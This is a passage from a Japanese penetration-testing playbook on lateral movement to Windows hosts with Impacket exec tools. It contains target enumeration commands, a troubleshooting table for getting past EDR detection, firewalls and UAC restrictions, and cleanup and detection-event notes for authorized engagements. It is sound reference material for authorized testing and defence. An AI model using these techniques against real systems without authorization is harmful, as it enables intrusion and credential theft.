netstat -ano | findstr LISTENING
```

```powershell
:: [Target] PowerShell が使える場合
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsBuildNumber, CsDomain
Get-LocalUser
Get-LocalGroupMember Administrators
Get-NetTCPConnection -State Listen
```

**接続後の AD 列挙・横展開・権限昇格は本ファイル範囲外** → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`。SeImpersonate / SeAssignPrimaryToken があれば Potato 系 SYSTEM 昇格は `../04_Post_Access_Windows_AD/Privilege_Tokens.md`。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `nxc smb (Pwn3d!)` が出ない | 一般ユーザー cred / ローカル管理者でない | BloodHound で writable ACE を辿る / 別 cred 探索 / `../04_Post_Access_Windows_AD/Privilege_Tokens.md` の Potato 系へ |
| wmiexec が `RPC_E_DISCONNECTED` | DCOM 動的ポート（49152-65535）が FW でブロック | §4 psexec / §5 smbexec（445 のみ使用）/ §6 atexec（135 のみ）に切替 |
| psexec が Defender で即検知 | RemComSvc.exe known signature | §5 smbexec（バイナリ書込なし）/ §7 dcomexec（DCOM 経由）/ §3 wmiexec |
| `STATUS_ACCESS_DENIED`（ローカル管理者で接続） | UAC リモート制限（`LocalAccountTokenFilterPolicy=0`）| ドメイン管理者で再実行 / 先にレジストリ書換 |
| すべての NTLM 認証で `STATUS_LOGON_FAILURE` | NTLM 無効化環境 | §9 Kerberos 経路へ |
| Kerberos で `KRB_AP_ERR_SKEW` | 時刻同期ずれ | `sudo ntpdate [DC_IP]` |
| Kerberos で `KRB_AP_ERR_MODIFIED` | IP 直打ち | FQDN + `/etc/hosts` 登録 |
| 全 5 ツールで失敗 | 445 / 135 とも FW で外部遮断 | `./WinRM.md`（5985 / 5986）に戻る / 別経路（RDP / VPN）|
| 接続できるが半対話シェルで出力文字化け | コードページ不整合 | 接続直後に `chcp 65001` 実行 / `-codec utf-8` オプション（最新 Impacket）|
| Sysmon / EDR で接続が即遮断される | 既知シグネチャ検知 | §7 dcomexec で DCOM オブジェクト切替 / `./WinRM.md` §6 Windows ネイティブ経路 |
| ハッシュ認証で `STATUS_LOGON_FAILURE` | ハッシュ形式不正 | `LM:NT` 形式 or `:NT` 単独形式の両方を試す（**LM 部分が空でも `:` は必要**）|

## 注意点・落とし穴

> **[HIGH IMPACT]** §4 psexec / §5 smbexec は以下の理由で本番では原則禁止または個別合意必須:
> - [x] SIEM / EDR で確実に検知される（Event ID 7045 サービスインストール、Event ID 4697 同、smbexec はコマンド数分発生）
> - [ ] 業務停止リスク（通常なし、サービス起動失敗時のみ）
> - [ ] 持続化に該当（残存サービス削除を確実に実施すれば該当なし）
> - [x] 不可逆な設定変更を含む（psexec がサービス起動失敗時にサービスを残す → 原状回復必須）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> **[HIGH IMPACT]** §8 認証スプレーは以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（アカウントロック発動）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM / EDR で確実に検知される（Event 4625 大量・4624 の IpAddress フィールドで接続元 IP 記録）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロックを横断する高影響の警告のみを置く。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — §4 psexec / §5 smbexec / §8 スプレー）/ ★★（口頭確認可 — §3 wmiexec / §6 atexec / §7 dcomexec は侵入後シェル取得の起点、cred 委任の影響範囲が広がる）/ ★（§1-§2 のポート判定・(Pwn3d!) 判定は技術的判断のみで実施可だが、対象組織との合意範囲は確認）
- **想定される SIEM / EDR 検知**:
  - Event ID 4624（LogonType 3 ネットワーク経由）/ Event ID 4625（認証失敗）
  - Event ID 4624 の `IpAddress` フィールド / `Microsoft-Windows-SMBServer/Audit` チャネルでの接続元 IP 記録
  - Event ID 7045（サービスインストール・psexec / smbexec）/ Event ID 4697（同）
  - Sysmon Event ID 1（`wmiprvse.exe` 子プロセス・`mmc.exe` / `explorer.exe` 子プロセス（dcomexec））
  - `Microsoft-Windows-WMI-Activity/Operational`（WMI メソッド呼出）
  - `Microsoft-Windows-TaskScheduler/Operational` Event 106 / 200 / 201 / 141（atexec）
  - PowerShell ScriptBlock ロギング（Event ID 4104）
- **業務影響リスク**: §4 psexec のサービス起動失敗時の残骸（手動 cleanup 必要）/ §8 スプレーでのアカウントロック / それ以外は通常なし
- **原状回復必須項目**:
  - ✅ §4 psexec / §5 smbexec で残存したサービス削除（`sc \\[TARGET] delete [SERVICE_NAME]`）
  - ✅ §4 psexec で ADMIN$ に残った PE バイナリ削除（`\\[TARGET]\ADMIN$\[SERVICE_NAME].exe`）
  - ✅ §3 wmiexec / §5 smbexec の出力受領ファイル削除（`\\[TARGET]\ADMIN$\__*` / `\\[TARGET]\C$\__output`）
  - ✅ §6 atexec で残存した task 削除（`schtasks /delete /s [TARGET] /tn [TASK_NAME] /f`）
  - ✅ §9 で `kinit` した Kerberos チケット破棄（`kdestroy`）
  - ✅ 取得した認証情報・ハッシュの安全な破棄
- **取得情報の取扱**: シェル経由で取得したファイルはテスト完了時に破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

> **シェル取得後の AD 列挙・横展開はこのファイルの範囲外** → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`。BloodHound 起動 / Kerberos 攻撃 / DCSync 等は `../00_Playbook/Windows_AD_Attack_Flow.md` の Step 4 以降。

## 関連技術

- 前：135 / 445 ポートの発見 → `../01_Reconnaissance/Network_Scanning.md`
- 前：SMB 列挙（共有・signing・OS バージョン）→ `../01_Reconnaissance/SMB_Enumeration.md`
- 前：認証情報の取得 → `Credential_Discovery.md`
- 前：(Pwn3d!) 判定の前段 SMB スプレー → `../05_Tools_Reference/Netexec.md`
- 前：ロックアウト設定の事前確認（§8 スプレー時）→ `Account_Lockout_Recon.md`
- 前：Kerberos チケット取得（§9 経路）→ `../04_Post_Access_Windows_AD/Kerberos_Attacks/Pass_The_Ticket.md`
- 関連：WinRM が開いていれば優先（5985 / 5986）→ `WinRM.md`
- 関連：ツールリファレンス（Impacket スイート全体）→ `../05_Tools_Reference/Impacket_Suite.md`
- 関連：NTLM Relay 経路（SMB signing 無効時の代替）→ `../04_Post_Access_Windows_AD/NTLM_Relay/ntlmrelayx.md`
- 関連：AD 環境での hosts 登録（§9 Kerberos 経路で必須）→ `../06_Concepts/Hosts_File_For_AD.md`
- 関連：Impacket exec の動作原理（DCERPC / DCOM / SCM / ATSvc・プロセスツリー差・SPN プレフィックス差）→ `../06_Concepts/Impacket_Exec_Internals.md`
- 関連：プロセスモデル・認証 negotiation の対比（WinRM 側で詳述）→ `../06_Concepts/WinRM_Protocol.md`
- 後：シェル取得後の Windows / AD 列挙 → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
- 後：BloodHound で AD 全体把握 → `../05_Tools_Reference/BloodHound.md`
- 後：SeImpersonate / SeAssignPrimaryToken 経由の SYSTEM 昇格 → `../04_Post_Access_Windows_AD/Privilege_Tokens.md`
- 後：DCSync 経由の全ハッシュ取得 → `../04_Post_Access_Windows_AD/Credential_Dumping.md`
